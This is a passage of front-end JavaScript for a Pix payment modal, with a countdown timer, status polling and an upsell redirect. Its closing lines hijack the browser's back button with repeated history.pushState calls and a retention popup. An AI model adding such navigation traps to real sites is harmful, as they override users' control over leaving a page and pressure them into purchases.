  try { document.execCommand('copy'); } catch(e) {}
  if (cb) cb();
}

function _pixStartTimer() {
  _pixTimerSecs = 900;
  clearInterval(_pixTimerInterval);
  _pixTimerInterval = setInterval(function() {
    _pixTimerSecs--;
    var m = Math.floor(_pixTimerSecs / 60).toString().padStart(2, '0');
    var s = (_pixTimerSecs % 60).toString().padStart(2, '0');
    var el = document.getElementById('pix-timer');
    if (!el) return;
    if (_pixTimerSecs > 60) {
      el.textContent = '⏳ ' + m + ':' + s;
      el.style.background = 'rgba(255,255,255,0.12)';
      el.style.color = '#fff';
      el.style.borderColor = 'rgba(255,255,255,0.18)';
    } else {
      el.textContent = '⚠️ ' + m + ':' + s;
      el.style.background = 'rgba(254,202,202,0.2)';
      el.style.color = '#fca5a5';
      el.style.borderColor = 'rgba(252,165,165,0.3)';
    }
    if (_pixTimerSecs <= 0) {
      clearInterval(_pixTimerInterval);
      clearInterval(_pixPollInterval);
      el.textContent = '❌ Expirado';
    }
  }, 1000);
}

function _pixStartPolling(txnId) {
  clearInterval(_pixPollInterval);
  _pixPollInterval = setInterval(function() {
    fetch('/api/status?id=' + txnId)
      .then(function(r) { return r.json(); })
      .then(function(data) {
        if (data.paid) {
          clearInterval(_pixPollInterval);
          clearInterval(_pixTimerInterval);
          _pixFirePurchase();
          document.getElementById('pix-content').style.display = 'none';
          document.getElementById('pix-paid').style.display = 'block';
          setTimeout(function() {
            _pixCloseModal();
            if (typeof redirectToNextUpsell === 'function') {
              redirectToNextUpsell();
            }
          }, 2200);
        }
      })
      .catch(function() {});
  }, 3000);
}

function _pixCloseModal() {
  clearInterval(_pixPollInterval);
  clearInterval(_pixTimerInterval);
  var modal = document.getElementById('pix-modal');
  if (modal) modal.style.display = 'none';
}

/* botão "Já fiz o pagamento" — checa o status na hora */
function pixCheckNow(btn) {
  if (!_pixCurrentTxn) return;
  var msg = document.getElementById('pix-paid-check-msg');
  if (btn) { btn.disabled = true; btn.style.opacity = '.6'; }
  if (msg) { msg.style.display = 'block'; msg.textContent = 'Verificando seu pagamento...'; }
  fetch('/api/status?id=' + _pixCurrentTxn)
    .then(function (r) { return r.json(); })
    .then(function (data) {
      if (data && data.paid) {
        clearInterval(_pixPollInterval); clearInterval(_pixTimerInterval);
        _pixFirePurchase();
        document.getElementById('pix-content').style.display = 'none';
        document.getElementById('pix-paid').style.display = 'block';
        setTimeout(function () { _pixCloseModal(); if (typeof redirectToNextUpsell === 'function') redirectToNextUpsell(); }, 2200);
      } else {
        if (msg) msg.textContent = 'Ainda não identificamos. Se já pagou, aguarde alguns segundos que confirma sozinho. ⏳';
        if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
      }
    })
    .catch(function () {
      if (msg) msg.textContent = 'Tente de novo em instantes.';
      if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
    });
}
window.pixCheckNow = pixCheckNow;

/* pop de retenção */
function pixRetainStay() { var r = document.getElementById('pix-retain'); if (r) r.style.display = 'none'; }
window.pixRetainStay = pixRetainStay;

window.addEventListener('popstate', function () {
  var modal = document.getElementById('pix-modal');
  var retain = document.getElementById('pix-retain');
  var paid = document.getElementById('pix-paid');
  var modalOpen = modal && getComputedStyle(modal).display !== 'none';
  var jaPago = paid && paid.style.display === 'block';
  if (modalOpen && retain && !jaPago && retain.style.display === 'none') {
    history.pushState({}, '', location.href); // re-trava
    retain.style.display = 'flex';
  }
});

// Bloqueia navegação para trás
history.pushState({}, '', location.href);
history.pushState({}, '', location.href);
